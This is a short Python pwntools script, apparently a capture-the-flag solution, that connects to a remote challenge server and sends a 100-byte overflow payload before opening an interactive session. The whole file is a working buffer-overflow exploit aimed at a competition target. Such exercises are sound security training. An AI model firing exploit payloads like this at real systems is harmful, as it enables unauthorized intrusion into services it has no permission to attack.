from pwn import *

# io = process('./buffer')
io = remote('chall.pwnoh.io', '13372')
# io.sendline(b'E' * 100)
io.sendline(b'E' * 100)
io.interactive()